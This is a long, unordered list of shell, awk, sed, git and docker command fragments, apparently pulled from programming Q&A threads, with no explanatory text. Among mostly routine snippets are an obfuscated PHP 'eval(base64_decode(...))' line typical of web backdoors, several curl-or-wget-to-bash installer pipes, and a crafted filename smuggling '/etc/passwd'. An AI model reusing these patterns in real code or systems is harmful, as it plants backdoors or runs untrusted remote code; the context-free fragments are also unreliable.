:autocmd BufRead * ...
:setlocal complete-=i
$ vpn-connect
python vpn.py
pydoc os
-E or -P
echo "string SEPERATED by spaces"
aws linux
[^ ]
DB_USERNAME =
echo "=${db%% *}="
javaldx failed!
bash -i
bc -l
2007-12-15 00:00:00
man grep
print ""
s/\][^\[]*\[/\] \[/
#! node
#!/usr/bin/env node
for i in `114,182,251,131,183,257,140,191,31,148,192,48,151,195,51,92,177,249`; do awk -v num=$i 'NR=2&&NR=4{print $0}' f_$i.dat > $i.dat; done
for i in $LIST ; do ... ; done
-v num=$i
> $i.dat
> $OUTFILE.dat
for i in ... ; do ... >> OUTFILE.dat ; done
' '
import re
if True:
if True
small_stmt ';' compound_stmt
COMPONENTS="\"TestComp\" \"Common Component\""
+ scm workspace add-components TEST_Workspace -s Test_Stream '"TestComp"' '"Common' 'Component"'
gen_epoch 2014-04-01T00:00:00 2014-04-01T07:00:00 3600
TZ=UTC date --date="1970-01-01T00:00:00" +%s
TZ=:/path/to/fixing/timezone date --date="1970-01-01T00:00:00" +%s
%d files to edit
"/home/myapp arg1"
/home/myapp arg1 ""
program ""
while read line
while read line; do ... done < $x
while read
cp C:/code.txt D:/code.txt
cp --backup=numbered C:/code.txt D:/code.txt
for i in $(command)
ps -ef
service mysql status
[%Y-%m-%d %H:%M:%S]
[2009/05/11 07:30:00]
[%Y-%m%d %H:%M]
s/([a-zA-Z0-9]+)/$h{$1} || "[$1]"/eg
s/([a-zA-Z0-9]+)/$h{$1} || "[$1]"/egi
use feature 'fc'
use Unicode::CaseFold 'fc'
./foo.sh -n -v SomeString Type Directory
top -b
shopt -s nullglob
echo ${PWD##*/}.pdf
hello world
$5!="1"{sum++}END{print sum}
awk -f wcYRI.sh ~/folder$1/file$1
./scriptname ~/folder file
./scriptname '~/folder$num/file$num'
#!/usr/bin/awk -f
local status=$?
$( ... )
fuser server.log
wc -w
tail -f
read -t
man lsof
tail -f
--foo on|off
-o command
errmsg lala lala
ls -1
mv: rename . to ..txt: Invalid argument
-type f
-type f
-mindepth 1
-name '*.*'
git status
coffee --output ./js --compile ./
coffee --output ./jsx --compile ./
coffee --output ./js --compile .
coffee --output js --compile cs
coffee --output ./js --compile .
coffee --output js --compile .
find -name "nametofind"
IFS= read -r myline; echo "$myline"
mydata=$(cat); echo "$mydata"
[[ $var ]]
[[ -n $var ]]
command 1> /.../path_to_file
command > /.../path_to_file
command 2> /.../path_to_file
command >/.../path_to_file 2>&1
unalias echo
echo 'vim +qall' | bash
vim +BundleInstall +qall
vim +BundleInstall +qall
#include <unistd.h>
#include <linux/sysctl.h>
find -exec
sh -c
grep -F
> /dev/null
sh -c
$(find . -type f | wc -l)
-not -path
gnu find
\( \)
"The start of the string (^), any character any number of times (.\*), then an equal sign (=), then an opening bracket ('\('), then any character EXCEPT '=', any number of times ([^=]\*), then a closing bracket ('\)'), then an equal sign (=), then any character any number of times (.\*), then an equal sign (=), then any character any number of times (.\*), then the end of the string ($)."
X-Foo: #1 fun
X-Foo*: UTF-8''#1%20fun
./a.out source >> target 2>&1
std::cerr<<"debug information"<<endl
./a.out source 1>>Result.txt 2>> Debug.txt
git remote add origin https://github.com/[username]/[projectname].git
git remote add origin git@github.com:[username]/[projectname].git
git add .
git commit -m 'your commit message'
git push origin master
df -h
export foo=bar
tar command
cp -p
rsync -go <source file> <destination file>
sudo chown
man bash
wget http://uk1.php.net/get/php-5.4.27.tar.gz/from/this/mirror
cd mirror
-bash: cd: mirror: Not a directory
cd /mirror
cd /mirror/
cd /mirror/
refresh:<variable id>
$SHELL -c
$result2 + $result3
Test succeeded
cd ..
{ grouped block; }
GNU awk
busybox awk
find $GLUE [...]
-not -iwholename */dir3/*
-not -iwholename dir3/file1 dir3/file2 dir3/file3
qsub -v A=foo,B=bar,C=cat,D=dog,E=qux jobfile.sh
set -u
set +u
set -/+u
menu -> terminal -> set character encoding
Current Locale
nmblookup -A 123.123.123.123
Looking up ...
-v pretty=$pretty
/Looking up status of/
[ -e /tmp/2007.txt ]
su - -c
{ ... }
[ -f
xxd -r -p
Centos 6.5
Mod Passenger
# curl -L https://get.rvm.io | bash -s stable --ruby
ruby -v
-bash: ruby: command not found
rvm install 2.1
/bin/bash --login
rvm list
rvm use
rvm list
ruby -v
rvm help
nawk: cmd. line:7: warning: escape sequence
ssh -i /path/to/private_key admin@server_host
admin@server_host's password:
ls -la | script.sh
ls -la
-d $'\0'
<(find . -name ${input} -print0)
shopt -s lastpipe
set +m
array=(`find . -type f | sort -r | head -2`)
mapfile [-d delim] [array]
/TESTING/ && NR>1 {print ""}
nslookup someServer
./script -a hj -b op -c zx -d some -f "File in list seperated with spaces"
blah.blah.blah.tar.gz: Scheme missing.
grep ^[a-z] file.txt
grep [a-z] file.txt
grep "^ *[0-9].*Online" ./myfile
./readargs *.ext1
./readargs *.ext1 *.ext2
file1.ext1 file1.ext2 file2.ext1 file2.ext2
find . -type f -name "*.xml"
echo {1..100}x{1..100}
START=($(awk -F'\t' '{print $5}' $inputGenes))
(( ... ))
bash -xv .bashrc
bash -x /etc/bash_completion | grep -E 'UNAME|USERLAND'
php script | cat
screen -a
nohup command > /dev/null 2>&1 & 
ctrl+b $
ctrl+b d
tmux attach -t <session_name>
ctrl+b %
ctrl+b "
ctrl+b <arrow in the direction of the screen you want to go to>
ssh userA@servA
ssh userB@servB
ssh servB
man bash
crontab -e
EDITOR=nano crontab -e
launchctl load ~/Library/LaunchAgents/killitunes.plist
-e 'sed-command'
sed: -e expression #1, char 1: unknown command: '<'
sed -n "/\<Directory \/\>/ a\Deny from all" $http_file
./script One Two Three
./script 01-JAN-14 02-JAN-14 site
./script date1 date2 site
WHERE date BETWEEN '$1' AND '$2'
AND site = '${@: -3}'
"${@: -3:1}"
"${@: -1:1}"
bash 4.2.37
bash 3.2
wget --no-glob --help
STATUS=$(id $i | echo $? )
echo $?
echo $?
busybox awk
{print $1 + 0}
busybox awk
print $1""+0
print $1(""+0)
busybox awk
+($1 ".")
gnu awk
cd ..
type quote
command quote
find -type f | xargs -grep -i -w 'weblogic_*'
No SMBIOS nor DMI entry point found, sorry.
1. json.dumps(result)
2. json.loads(result)
-o <file>
history -r
history -s
history -w
bash --login
3*$w2 + $float
bc -l
directory_100bp/directory/<some content>
directory_100bp/<some content>
ssh-keygen -q -t rsa -N '' -f repo-key
git clone https://MY_TOKEN@github.com/user-or-org/repo
sh rundocker.sh MYTOKEN=foo
git clone
git clone
git clone
--ssh default
--ssh default
ssh-keygen -t ecdsa
App Configs
@Calvin Froedge
sudo easy_install pip
sudo pip install virtualenv
virtualenv env
"-bash: virtualenv: command not found"
ps -ef | grep classpath myprog.jar
grep -P
ps -ef | grep ...
ps -ef
o pid,args
bash scripts
bash script
bash scripts
yourmainscript 2>&1 | tee log
xargs gunzip -c
cat myJar.jar |ssh user@host "cd someFolder; java -jar -"
mkdir -p someFolder;
bWords=( ${bDesc} )
for bWord in ${bWords[@]}; do for pWord in ${pWords[@]}; do ...
bWord == pWord
continue 2
./p.pl whotb
cd /source
-type f
mkdir -p
gnu awk
su root -c "/bin/bash -c <non-trivial command>"
$SUDO <command>
lc_ary=( "${line_ary[@],,}" )
if [[ -z "$FOO" ]]
< <(...)
sed 's/./&\n/g'
tr -d '\n'
grep -o .
>/dev/null 2>&1
grep: Trailing backslash
$newLines="new line"
# Lines Start #
# Lines End #
sed -E 'N; s/# Lines Start #\.*\# Lines End #/$newLines/'
new line
!/^[0-9]/ {next}
!/OK/ {print "BAD UNIT DETECTED:",$0}
echo "if ( 1.2>1.3 ) 1 else 0" | bc
ls -la | prog.sh
ls -la
w | awk '{print $1}'
id username
tmp=( $(w | awk '{print $1}') )
man bash
oSET="$-"; set -f
set +f -$oSET
oIFS="$IFS"; IFS=$'\n'
artisan ci:cleanup
|| true
11191 12345
{ and }
s/, / /g
exec | tee $BKLOG
&>, 2>&1
curl --referer http://example.com/bot.html http://www.cyberciti.biz/
curl http://www.cyberciti.biz/
Program Files
Program Files (x86)
Program Files
Program Files (x86)
Program Files
print name2value["Tx Power"]
tr -d '^M'
0 0 2-31 * *
0 0 1 * *
sleep 600
gzip -9
xz -9
*/10 * * * * user test.sh
awk -f script.awk inputfile
GNU bash, version 5.0.17(1)-release (x86_64-pc-linux-gnu)
ls -lsa -it -r
export PS1="\w \$"
\w \$
\w $
less -+S
git diff | cat
git diff
:r !{cmd}
:let output = system('test.sh')
:r !
join -1 1
date +%M
date +%H
<a href=
exit 0
kill -l
128 + <signal number>
man screen
ssh me@linux -R 9999:127.0.0.1:<SMBPORT|ETC>
Subsystem shareduserbinary sudo su -l -c "/bin/mount -t cifs -o port=9999,username=me,nounix,sec=ntlmssp //127.0.0.1/exported_bin /mnt/remote_bin" && bash -l -i -s
ssh -R 9999:127.0.0.1:445 -s shareduserbinary me@linux
man ssh_config
ps axww
vi /etc/httpd/conf.d/mime.conf
grep -v grep
kill -9
ls > outfile
set -xv
set -xv
set +xv
bash -x yourscript.sh
bash -x
$ python test.py 2
$ python call.py ARG
done 2>/dev/null | sort
ls /path/to/folder/*.tar.gz | head -1
set --
-maxdepth 1
-type f
-iname "*.tar.gz"
| head -1
| head -1
-print -quit
ssh admin@machine <<EOF
Pseudo-terminal will not be allocated because stdin is not a terminal.
man ssh
<<EOF ... EOF
if [ 0 ]
if [ $? ] or if [ "$var" ]
[ ]
[[ ]]
(( ))
const char
man test
[ $? -eq 0 ]
shopt -s nullglob
chmod +x gorilla
php -h
cmp file1 file2
diff -q -s file1 file2
-bash: /usr/local/bin/safasdfasdf: No such file or directory
brew install dos2unix
dos2unix -i /Users/john/Desktop/files.txt
mac2unix /Users/john/Desktop/files.txt
bash CREATE:command not found.
mysql -u root --password=passwd
hadoop fs -cat
bash catavro.sh [path to avro data on hdfs] > tmp.avro
n >= 1
echo OK
done < <(curl -sL vpn-proxy-list.txt);
MAXINT - FLOOR
$RANDOM + $FLOOR
split /(?<=^END\n)/m
for (...) { ... }
open $fh, ">..."; print $fh $_
$k=1; ... $k++
kishore$ docker build --tag=k3_s3:latest .
kishore$ docker run -i -t k3_s3:latest /bin/bash
run -d -v
docker run
docker run -v /var/logs/on/host:/var/logs/in/container ...
docker run -t -i -v <host_dir>:<container_dir>  ubuntu /bin/bash
-v /var/logs/on/host:/var/logs/in/container
docker run
Docker version 0.9.1, build 867b2a9
docker run -v /src/path:/container/path
docker run -v ${PWD}:/projectpath
docker run -v ${PWD}:/projectpath
echo TEST > hostTest.txt
C:\Users\My PC\AppData\Roaming\DockerConfigs\Organizr
Apps Key
"/c/Users/My PC/AppData/Roaming/DockerConfigs/Organizr"
docker run -it -v /Users/<name>/projects/:/projects <container_name> bash
ls /projects
cd /path/to/your/working/directory
Substring Expansion
0  A
&& -le 90
0 A
&& average < 90
average >= 90
sh PreStartupCommands.sh
chmod +x PreStartupCommands.sh
"$answer" ==
man bash
curl -L http://install.perlbrew.pl | bash
curl -L http://install.perlbrew.pl
curl -V
yum groupinstall 'Development Tools'
PERLBREWDOWNLOAD="curl -f -sS -Lo $LOCALINSTALLER $PERLBREWURL"
wget -O - http://install.perlbrew.pl | bash
while loop
while loop
grep -A4
awko data
delete a
3.5 GB
5 different threads
400 parallel transfers
ipaddress + port
:S=string from the page after successful login
-c -p15 -m12
-c -p15m12
break 2
ERROR 403: Forbidden.
man proc
gzip somefile.js
$ xdotool getmouselocation
x:392 y:344 screen:0 window:54799020
count == 0
grep -w
#PBS -t 1-1000%100
alarm 0830
man at
printf '\e[?8h'
head -n1
tail -n+2
awk '{print $n}'
date --date="$my_date - 1"
delete=( "$var" )
list=( "${list[@]/$var/}" )
list=( "${list[@]/%$var}" )
[ ${#item} > 0 ]
find -type f
find -type f -iname "[a-z,0-9]*"
bash -c
const char*
export PATH=$PATH:<your stuff>
export PATH="$PATH:current_working_path"
source ~/.bash_profile
for $(cat file.txt)
composer update
php artisan migrate:refresh
webmod directory/name/here
\; find
find $1 -exec ./script1.sh {} \; chmod g+s -R $1
RPM version 4.11.1
sudo /path/script.sh
exec 200>file
man 1 flock
for file in *.eps
filename=$(basename "$file")
convert $file $filename.png
convert: not authorized
-dBATCH -dNOPAUSE -sOutputFile=
$(basename "$file")
for ...; do
gcloud auth login
shift [n]
man bash
Parameter Expansion
Substring Expansion
echo {1..3400..34}
echo {35..3400..34}
b=$(seq 1 1 10)
echo ${b[0]}
sed 's/\n/ /g' file
sed 's/hello/hello\n/g' file
read -a
read -a
read -d '' -a
read -a
-d ''
sed -e 's/^; *//'
ps ax | grep my_application
exit 2
ps ax
ps ax
grep application_name
man ps
sed -i
-c true
service stop
sudo check_ssid
echo $PATH
cp /Users/MacOwner/Desktop/rnaseq/pslToBed /usr/local/bin/
export PATH=$PATH:/usr/local/bin/pslToBed
-bash: /usr/local/bin/pslToBed: cannot execute binary file
bar=(1 4 7)
find /some/path -name 'regex'
ls -R -1 /some/path | parallel --profile manyhosts --pipe egrep regex
$JAVA_HOME -V
grep -f
./programm 123456
tail -f
[ \t\r\n\v\f]
Clone: xx%
Clone: <numbers>%
man grep
sed "s/...
`echo $@`
Your path: ../test/tester [hello] whatever
Your path: ../../tested/text [hello] whatever
-bash: forever: command not found
which npm
man ssh
login shell
man bash
do for
load 'config.gp'
vim ~/.bash_profile
sudo vim ~/.bash_profile
source ~/.profile
source ~/.profile
-bash: /home/user/.bash_logout: Permission denied
which networksetup
networksetup -getdnsservers 'Wi-Fi'
cmd="$getdns '$i'"
; exit 1
/cygdrive/c/cygwin/bin/bash.exe myscript.bat
while true; do
grep -w -f
rerun ruby X.rb
rerun ruby sample.rb
alias sin="rerun ruby ${PWD##*/}.rb"
ruby: No such file or directory -- David.rb (LoadError)
alias sz="source ~/.zshrc"
git pull origin <current branch name>
git rev-parse --abbrev-ref HEAD
[[ ... ]]
' '
awko data
print >
& a[i]=$!
wait $(echo  ${a[@]})
find . -type f | (let i=0; while read f; do mv "$f" "$f"-$i ; let i=$i+1; done)
echo 'Pages: '.sizeof($pdf->pages).'<br />';
echo $thumbPath.$currentfilename.'<br />';
echo $file['tmp_name']."[$pageCounter]<br />";
var_dump($return); echo '<br />'; echo var_dump($out); echo '<br />';
while loop
two for loop
<java.lang.String value="something"/>
<java.lang.String value="anything_except_quotes"/>
sort -k
NR==FNR{a[$2]=$0; next}
a[$2]>0{print a[$2],$1}
something-07-05-2014 08-00-00
something-08-05-2014 08-00-00
+20 scrapy crawlers
twisted server
twistd -y <server.py>
[ ]
read -r
cat <<'here' >file
mysql -u root -ppassword
-bash: mysql: command not found
./a.sh arg1 arg2 | tee log
nohup bash b.sh 2>&1 > /tmp/log &
the search string
#!/usr/bin/env bash
sh script
shopt -s xpg_echo
enable -n echo
@@ 
@@ 
sed -i 's/.././g' /tmp/folder/domains.new
seq -f '4/%g' 1 2 99999
paste -sd-+
bc -l
echo "scale=10000; 4*a(1)" | BC_LINE_LENGTH=0 bc -l
time <command>
ln <target file> <link name>
ln <link name> <target file>
man ln
-bash: [-f: command not found
grep -P
./compile_less.sh: line 6: [: too many arguments
src/styles/*.less src/styles/brand/*.less
[ != _ ]
[ != _ ]
[ all your filenames here != _ ]
[ and ]
./kl.sh hj jl lk
bash kl.sh hj jl lk
echo $#
jps -v
jps -v
jps -v
awk {print $1}
echo -e "enter a number:\c"
column -t
while ...; do ...; done | column -t
-f pattern.txt
man grep
e.g. myproperty='@SOME_ENV_VARIABLE@'
gzip -d
bash "!#" symbols
gawk >= 4.0
centos Linux
oracle server
oracle client
lsnrctl services
/:/{h=$1 FS $2}
{for (i in a) print i,a[i]}
for f in rec*
:a;N;$!ba;s/\n/, /g
s/, , /\n/g
, ,
declare int"$((++k))"=test
mysql -B -N -u $USER -p$PASSWORD -h $HOST -e "UPDATE $DATABASE.$TABLE SET Status='-1' WHERE Id=$ID"
SHOW SLAVE STATUS
bad interpreter
tool in the
man (name of your shell)
error: bash:./rrr: permission non accordée
Use of undefined constant PATH
nc -v -z 192.168.8.216 9100 | awk '{print $NF}
source script.sh
source scriptname
source scriptname
. scriptname
source scriptname
bash -c "..."
bash -c "..."
bash -c "..."
awk 'NF > 0' testing.txt
awk NF testing.txt
{print $0}
awk NF file
declare -p lst
echo ${a[@]/%/.ext}
chmod +x banana
sips -z maxWidth# nameofimg.jpg"
echo $(cat $file) > $file
touch $file
echo $b
echo "$f"
sudo apt-get install dos2unix
[my_shell, '-c', command]
gdb --tui myprogram
run "/bin/sh"
while IFS= read -r line
man find
-execdir utility [argument ...] ; 
for fname in $(find ...)
ln -s
-type d
-maxdepth 1
ls -la | awk '{print$09}'
ls -la | awk '{print$09}' | sed 's/\/*$//
$ for file in $(ls -la | awk '{print$09}' | sed 's/\/*$//') ; do sudo ln -sf "$PWD/$file" "/home/inukaze/$file" ; done
ln: <</home/inukaze/./.>> : cannot overwrite a directory
ln: <</home/inukaze/../..>> : cannot overwrite a directory
echo $AMAZON_ACCESS_KEY_ID # => ''
heroku config
help source
ls -l /path/to/dir/*.extension 1>&- 2>&-
1>&- 2>&-
! -perm -u+w
/usr/libexec/PlistBuddy -c "set :CFBundleURLTypes:1:CFBundleURLSchemes:0 $SCHEME" "$INFOPLIST_MYAPP"
set :CFBundleURLTypes:1:
set :CFBundleURLTypes:0:
local -n
printf %q
printf '%q'
local -n
!DO NOT USE!
>(printf ..)
_passback x
sleep 1;
_xcapture a d; echo
_passback x
!DO NOT USE!
local -n
_passback x
$("${@:2}" 3<&-; _passback x >&3)
passback() { set -- "$@" "$?"; while [ 1 -lt $# ]; do printf '%q=%q;' "$1" "${!1}"; shift; done; return $1; }
capture() { eval "$({ out="$("${@:2}" 3<&-; "$2_" >&3)"; ret=$?; printf "%q=%q;" "$1" "$out"; } 3>&1; echo "(exit $ret)")"; }
local -n
script: 3: script: Bad substitution
chmod u+x /path/to/script
/system/bin/sh: ./test_script.sh:
in regards of permissions and other applications
python3 manage runserver
python3 manage test
python3 manage functional_test
program options out-file in-file
echo 1>&2 message
grep -vf
echo 'here file will be deleted'
set -x
grep *
find . -name "*.kaks" -type f -maxdepth 1
-depth 1
-type f
grep -f A01/genes.txt
arguments list i.e.
executable applications
cd m
permission denied
chmod +x m
cd m
man bash
find . -name "*.c"
wc -l
<$bytes> <$filename>
awk '{print $1}
awk -F, '{$1" "$2}' $var
awk -F, '{$1" "$2}' "$var"
cd "$(bd)"
[$dateForDeletion < $date]
[[ $dateForDeletion < $date ]]
[uid > 1000]
[ "$uid" -gt 1000 ]
`sudo userdel $username`
cd /Users/my_username/s3cmd-master
./s3cmd sync -r /Users/my_username/some_folder s3://some_s3_place
run 'foo' from the current directory
type s3cmd
type s3cmd
Id Users
Id Users
awk -f awkpass.awk /etc/passwd
/anyone/{print "Username\t\t\t" $1
-f awk.script
-v varname="value"
&& (i != NF || $0 ~ / $/)
Leonardo DiCaprio
Will Ferrel
Gwyneth Paltrow
Leonardo DiCaprio Will Ferrel OtherName Gwyneth Paltrow
Leonardo DiCaprio
Will Ferrel
Gwyneth Paltrow
grep -v '--'
/* */
… -a ↵
ls -l -a
-h -t .
declare -i I=2
declare -i I=4
echo $($I) #first access $I, which is 4 and
# then print $4, which is the 4th argument
variable indirection
man stat
stat -c %s <file path>
awk -F, '{print substr($0, index($0, $2))} text.txt'
command substitution
grep -E "cellIdentity=" input.xml
./myscript.sh 2>&1 | tee sabs.log
awk -v varname="var" -v user="David" '$1==user {print varname;}"'
$1 == username
$1 ~ username
$1 == username
year=YYYY ; month=MM ; day=DD
BEGIN { FS=OFS="," }
gsub("-", ".", $1)
directory 1
ifconfig -a
>= 0x80
Program Files (x86)
read -r
echo -e
line 26: 0++: syntax error: operand expected (error token is "+")
line 26: 0++: syntax error: operand expected (error token is "+")
find . -type f -mtime -1 | xargs -I file tar -cvzf file.tar.gz file
man xargs
-L 1
-I file
"What do we say to the God of Death?
echo ${array[*]} | md5sum
.zip file
BACKUPTIME="_2230 _2250"
"Package A" "Package B" "Package D"
[[ ... ]]
"YOURSTRING" =
"$( ... )"
echo "YOURSTRING" | grep -o '.'
-o '.'
sort -n |
tr -d '\n'
{print $0}
c:\program files\git
mpstat -P ALL | awk '$12 ~ /[0-9.]+/ { print 100 - $12 }'
Time Zone
Date & Time
Set time zone automatically
Time Zone
Set time zone automatically
dpkg: error: dpkg status database is locked by another process
apt-get update
{ ... }
{ ... }
{ ... }
anonymous function
group command
" [0-9]+"
echo "$options"
' '
$options="Package A" "Package B" "Package C"
[ -d *Game* ]
[ -d "Game_of_Thrones_S04E01.mkv" "Game_of_Thrones_S04E02.mkv" ... ]
size="$(identify --format "%w %h" "$image")"
mv file1.txt file2.txt
mv: cannot stat 'file1.txt': No such file or directory
sed 's/find/replace/'
type envsubst
-bash: type: envsubst: not found
envsubst is hashed (/usr/bin/envsubst)
who -b
last reboot
grep -o
who -b
2014-05-12 21:51
who -b
rails new <app>
git init
( ... )
false; echo qwe
echo qwe
set -e; ( false; echo qwe1; ) || echo qwe2
set -e
|| exit
echo '<space> ########### Following code does this #########<space>'
bash script foo bar baz
help set
set: set [-abefhkmnptuvxBCHP] [-o option-name] [--] [arg ...]
-type d
-printf %f
man find
info --raw-escapes --subnodes find | less --raw-control-chars
git show
git show
tr -d '\n'
git show
read -d ''
java.io.IOException: error=2, No such file or directory
java.io.IOException: error=2, No such file or directory
nano file.sh
hdfs dfs -put file.sh /path/you/need
tail -n 7
tail +7
ssh host
function ssh() { ... }
run("umask 002")
Ubuntu 12.04
echo -n '...' $'\r'
progreSh 24
ssh find
ssh remote zgrep "regex" file1 file2 file3
ssh -o SendEnv …
print data.Data
$(shell )
make echo
make echo1
su -c history username
echo $(( RANDOM %= 15 ))
column -t
-p "-jkl -m something"
find -exec
./herd -p -jkl -m "some stuff" \; -a foo
./er -jkl -m "some stuff"
while read h; do ssh -n "$h" 'sleep 10'; done </tmp/hosts
ps -fC ssh
pdfunite *.pdf output.pdf
ls -v
sort -n
IFS=.. read -ra ..
./11.pdf ...
find -name -delete
xargs rm -f
for in
for i in ls -d Module*; do
for i in Module*/;do
for i in ls -d Module*; do
for i in $(ls -d Module*; do)
for i in Module*/; do
IFS= read -r
npm get prefix
$ sudo npm install -g firebase-tools
$ ps aux | grep node
$ npm install -g @google-cloud/functions-emulator
$ firebase --version
nvm list
nvm use x.x.x
nano ~/.bash_profile
export PATH="<cmd+v>:$PATH"
export PATH="/Users/macbook/.npm-global/bin:$PATH"
npm get prefix
firebase --version
firebase login
npm i -g firebase-tools
sudo npm i -g firebase-tools
$ npm install -g firebase-tools
$ firebase init
$ npm get prefix
npm install firebase-tools
sudo npm install -g firebase-tools
firebase login
npm install firebase-tools -g
npm get prefix
alias <output of npm get prefix>/bin/firebase
source .bashrc
$ npm install -g firebase-tools
$ firebase init
C:\Users\ 'username' \AppData\Roaming\npm
$ npm get prefix
curl -sL firebase.tools | upgrade=true bash
firebase -V
sort -t. -r -b -n -k1.2,1 -k2,2 -k3,3 "$item"
tail -r
for ... in
readarray -t files <<<"$(find . -type f -name README.md)"
mvn clean package
hello world
awk -F'"[|]"' '{print NF}'
gnu awk
awk -F'"[|]"' '{print NF}'
output > file.txt
output >> file.txt
grep ... <<<"$line"
tail -f | grep -q ...
kill -9
which pyside-uic
su -s
su -s /bin/bash apache -c "/usr/bin/something an arg"
for f in .* *
line 3: back.sh: command not found
pr -m
-m, --merge
sudo service apache2 reload > /dev/null
5.3.3-7+squeeze17 with Suhosin-Patch (cli) (built: Aug 23 2013 15:06:16)
sed: -e expression #1, char 4: extra characters after command
working=$(sed -n '3,5p'  ${myFile}  | grep -n  "string" |cut -f1 -d: )
notWorking=$(sed -n  '${LINESTART},${LINEEND}p'  ${myFile}  | grep -n  "string" |cut -f1 -d: )
grep -Ff temporal3 map
$1, $2
grep 'error'
set -e
shell_exec('exiftool -a');
export PATH="what:you:want:your:PHP:path:to:be"
exiftool 2>&1
find / -name ExifTool.pm
awko infile set*
mkdir -p
export EDITOR=vim
git config --global core.editor vim
$aapr [options] [filename]
-bash: aapr: command not found
close("base64 -d -")
awk -f <yourscript>
awk 'BEGIN {while ( ("ls -1" | getline) > 0 ) {print}}'
rm $name
sudo or ssh
sep=" "
-bash: /usr/local/bin/rbenv: Permission denied
$ brew list
$ ls /usr/local/bin
rbenv install 2.1.1
printf '%q' $IFS
public static void Main()
VariableA = (VariableB-VariableC) / 60
Variable A
VariableA = $((VariableB-VariableC)/60)
VariableA = $(((VariableB-VariableC)/))/60)
AllowOverride None
AllowOverride All
grep -n "AllowOverride None" input.file
cut -f1 -d:
sed "$LINE_NUMBERs/.*/AllowOverride All/" input.file
(<Directory "/var/www/html">)
-f -
ls -ltrh aggregator.lock |awk -F" " '{print $7}'
date +"%T"
$now - $locktime
$(( ... ))
man stat
$(( ... ))
man bash
hg merge my_branch && hg ci -m "I just merged my branch"
branch_and_commit() { hg merge $1  && hg ci -m $2; } ; alias bac=branch_and_commit
bac my_branch_id "this is the comment"
CURDATE=$(/usr/bin/date '+%A %W %Y %X')
-W depend=afterok:$ID_of_previous_job
bash run.sh "python worker.py"
python worker.py &
man bash
jobs -l | grep 'worker.py' | awk '{print $2}'
up 2
up 2<TAB>
up 2
up 2<TAB>
up /demos
up 2/au<TAB>
up /demos/au<CURSOR>
bind 'TAB:menu-complete'
up /demos/au<CURSOR>
man bash
kill -3 $(pidof java) |tee -a /dumpfile
gnu grep
split -l5000000 data.tsv '_tmp'
ls -1 _tmp* | while read FILE; do sort $FILE -o $FILE & done
sort -m _tmp* -o data.tsv.sorted
all currently active child  processes  are  waited  for
find initial/path
find initial/path | sed 's,^initial/path/,,'
-F -
print $1
cut -f1,2 -d'-'
openvpn --daemon --config /tmp/OpenVPN/config.ovpn >/dev/null 2>/dev/null || echo "openvpn return with an error"
my dir
{f=1; next}
{print $0}
info sed
grep -n
grep -m1
sed "[line number] d"
some_nr 2014-05-15 21:58:00,000000 rest_of_line
from and to
./p.pl A_22:09:14
rm -rf bar
mv foo bar
robocopy path/to/source path/to/target -MIR
chmod 755 platform
. ./setantenv.sh
. ./setenv.sh
awk 'p;/^$/{p=1}'
yum check-update | awk '/\S+\s+[0-9]\S+\s+\S+/ {print $1 }' > updates
yum check-update
<package name><spaces><version number><spaces><repo name>
clean=(Clean: a=$out@cleanup b=$out@cleanup)
compgen -d -- $cur
compgen -d -- $cur
chmod +x
^([^ ]+)
( )+
echo $p_id
1 2 3 4 5 6 7 8 9 10
a b c d
rev | cat
yes | {command}
echo " N Y Y" | command
fgrep -v
for i in $(...)
-i inplace
<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25"));?>
IFS= read -r -d ''
$'./ \n/etc/passwd'
mv file1 1235
readlink -f
read -r -d: COMPONENT
<<< "$PATH"
s3cmd sync
permission denied
help read
if (($?>128))
-exec cat {} +
wc -l
ruby setup.rb
sh.exe: ruby: command not found
My Computer
Advanced System Settings
Environment Variables...
System Variables
match +incdir+foo
match +incdir+foo+bar
ln -s source target
ls -l yourfile
Google Drive/Developer/git repositories/dotfiles/dot_file
ls -l
sed's/\n/<br>/' <log-file >html-file
grep "ba" test-matching.txt
grep -e "ba{2,}" test-matching.txt
grep -e 'ba{2,}' test-matching.txt
grep -e "ba\{2,\}" test-matching.txt
grep 'ba{2,}' test-matching.txt
grep "ba\{2,\}" test-matching.txt
grep -e 'ba{2}' test-matching.txt
grep -e 'ba{2} test-matching.txt
grep -E
grep -e
egrep '(ba){2,}'
grep '\(ba\)\{2,\}'
cordova platform add android
UserName@ComputerName Path (Branch)
echo $PS1
\[\033]0;$MSYSTEM:\w\007\]\n\[\033[32m\]\u@\h \[\033[33m\]\w$(__git_ps1)\[\033[0m\]\n$
"eth0 lo wlan0 wlan1 "
bash 3.2
OS X
OS X
bash 4
bash 3.2.51
2014-05-16T08:01:00-07:00|993820594| |2014-05-16T08:01:00-07:00|993820594| |2014-05-16T08:01:00-07:00|993820594|
column -t
FILENAME=$(basename $1)
-l 3000
cp -rL /source /destination
[[ `foo` ]]
#!/usr/bin/env ruby
ruby -v
\( ... \)
trap 'echo' DEBUG
! -iname "*.part"
VAR=$(git log -n 10 --format="%s")
echo "$VAR" | wc -l)
grep -c '^'
for f in (/opt/media/rec/*.mp4); do echo $f; done
$(cat file)
$(< file)
shell_exec("sudo useradd -m ".escapeshellcmd($user_name)." -s /sbin/nologin"." -p ".crypt(escapeshellcmd($user_password),"abcd"));
shell_exec("sudo deluser --remove-all-files -f ".$username);
SOMEPROCESS | tee /my/safely/generated/filename
tail -f /my/safely/generated/filename | grep -i "my grep pattern
alias="./vendor/bin/<binary-name> $@"
trap my_function DEBUG
man uniq
uniq -u
uniq -u
uniq -u
sort filename | uniq -u
seq 80 10 100
service neutron-plugin-openvswitch-agent restart
/etc/init.d/neutron-plugin-openvswitch-agent restart
e + the next 2 characters
grep -Eo
tr -d '\r'
while read
bash -xv <script name>
info bash
exec_and_mail some_command -with arguments --passed --to it
sort -nk3 -k2,1 aaa
git log --pretty=oneline --name-only
sort | uniq
git log --pretty=oneline
git diff-tree --no-commit-id --name-only -r <sha-id>
git diff --name-only  $(git rev-list --max-parents=0 HEAD)
<div …>
<div class="item">
pip completion
pip completion
pip + TAB
tail -f /var/log/some.log | grep EVENT1 |rate
sudo apt-get install pv
yum -i
(while true; do echo yes; sleep .1; done)
return 2>/dev/null || exit
cat test.txt | perl -ne 's/"NATIVE(?![^"]+XLSX?")[^"]*"/""/g; print;'
{some word}
{some word::some word}
! -path
! -path (your path)
-p "Enter the string: "
echo "$str"
df -h
echo $df
mv: missing destination file operand after
Development is in progress...
Testing is in progress...
cd $num
12 to 13
13 to 12
:cd dir
/<\/review_text>/ {f=0}
</review text>
f {print >> (t".txt")}
<review text>
/<review_text>/ {f=1; t++}
<review text>
Warning: Using a password on the command line interface can be insecure.
